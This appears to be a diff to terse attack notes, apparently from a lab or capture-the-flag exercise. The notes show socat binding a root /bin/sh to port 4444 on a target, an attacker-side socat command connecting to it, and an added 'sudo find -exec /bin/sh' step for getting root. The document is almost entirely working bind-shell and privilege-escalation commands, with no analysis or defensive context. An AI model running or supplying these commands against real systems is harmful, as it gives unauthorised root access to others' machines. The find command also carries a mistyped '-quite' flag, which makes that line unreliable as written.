@@ -9,3 +9,8 @@ sudo socat TCP4-LISTEN:4444,reuseaddr EXEC:"/bin/sh"
 
 attacker machine
 socat - TCP4:192.168.123.160:4444
+
+
+
+to get root user
+cmd: sudo find . -exec /bin/sh \; -quite
